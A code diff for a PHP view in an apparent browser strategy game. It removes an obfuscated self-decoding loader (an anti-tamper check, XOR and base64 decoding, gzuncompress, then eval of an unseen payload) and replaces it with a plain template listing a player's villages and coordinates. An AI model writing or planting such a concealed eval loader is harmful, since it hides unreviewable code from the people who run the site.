@@ -1,24 +1,30 @@
-<?php
-$yoornsc="f1b5f3c636d4eba1167cb6c719694bcb";
-$uxgngtrxml="0253560451515a5706035306015b540207525302005053075701570d0600565b";
-$suqeqs="HLihZeoM6lEtiHDQeQd5YiTt0rrMwAVuSR5AFZbrvkjhxP6CiLQ/pgOEJGjtjtRiTlX4/rBTWhqAk4XHw5PMt+v/f1XVlMxKvRYYAlSpFIsfmsw1L6+tBWd1+QrefifZuX0RMIADFyKUIvcXTwQzydOFp5X4pgxig8v/B9VzuNz6X4QWuqIMkqunbUsUdT1WADNgH0h3FBXxL3bbem1arkj/QJHh8oeg97BqCM2s41+1Wq8PAp886Qtobx5vN+vfL2ifZK0aZ0MvCkSoFaXAbx0KEfMn0EwuxxdA1OT096Y/fX9yej92Cm4X1CBqJDTABs0r1Ve4agdFeMPu+hoZrrMMf3dHTw9/W7xceLqrRGMFyIU7k4mkGIWJbcNnk2SdrVRNrgMkdYuaxMwDbnSH9icGk23TvROO16Ik66ZpAvMMB8SCQveCsuNWra/34ox2l23+Fqpz41286ufqgmCm/ojGbzbAu6EKxhX5Kq6N7yt83pz/8f4uy5fT2c0+XNgyqbe9nKyyd9194V+0tLELdb1Hqh80HczPXQpp5eLjzgbbTwzaSsf5N5S5blc+mVdNQCaRIZNZhVobKHsF/xHlB3OfB8AgzId7xw==";
-$twcrnglfme=file_get_contents(__FILE__);
-$pbxjqnv=str_replace($suqeqs,"",$twcrnglfme);
-if(strpos($pbxjqnv,"ec"."ho")!==false||strpos($pbxjqnv,"pr"."int")!==false||strpos($pbxjqnv,"var_"."dump")!==false||strpos($pbxjqnv,"file_put_"."contents")!==false||strpos($pbxjqnv,"fw"."rite")!==false){die();}
-$gfoppgaf=str_replace(array($yoornsc,$uxgngtrxml),array("SP_573f4624","KP_e3673489"),$twcrnglfme);
-$zxtaujhw=md5($gfoppgaf);
-$xgusrwnz=hex2bin($uxgngtrxml);
-$zmfjsqwh="";
-$iycsbk=strlen($zxtaujhw);
-for($kbqelusmi=0;$kbqelusmi<$iycsbk;$kbqelusmi++){
-$zmfjsqwh.=chr(ord($xgusrwnz[$kbqelusmi])^ord($zxtaujhw[$kbqelusmi]));
-}
-$ugrynjmhp=base64_decode($suqeqs);
-$hnyshec=strlen($ugrynjmhp);
-$hthhkrbpn="";
-$gilhkmdevn=strlen($zmfjsqwh);
-for($kbqelusmi=0;$kbqelusmi<$hnyshec;$kbqelusmi++){
-$hthhkrbpn.=$ugrynjmhp[$kbqelusmi]^$zmfjsqwh[$kbqelusmi%$gilhkmdevn];
-}
-$ckrroiz="gzun"."compress";
-eval('?>' . $ckrroiz($hthhkrbpn) . '<?php ');
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<center>
+    <table class="vis padding2" width="100%">
+        <?php if (!empty($villages)): ?>
+            <tr>
+                <th><?= __('screens.place.village_col') ?></th>
+                <th><?= __('screens.place.coords_col') ?></th>
+            </tr>
+            <?php foreach ($villages as $v): ?>
+                <tr>
+                    <td height="18px">
+                        <a href="#"
+                            onclick="insertNumId('x','<?= $v['x'] ?>');insertNumId('y','<?= $v['y'] ?>');javascript:inlinePopupClose()">
+                            <?= htmlspecialchars($v['name']) ?>
+                        </a>
+                    </td>
+                    <td align="center">
+                        (<?= $v['x'] ?>|<?= $v['y'] ?>) K<?= $v['continent'] ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td height="18px" align="center">Não possui outras aldeias.</td>
+            </tr>
+        <?php endif; ?>
+    </table>
+</center>
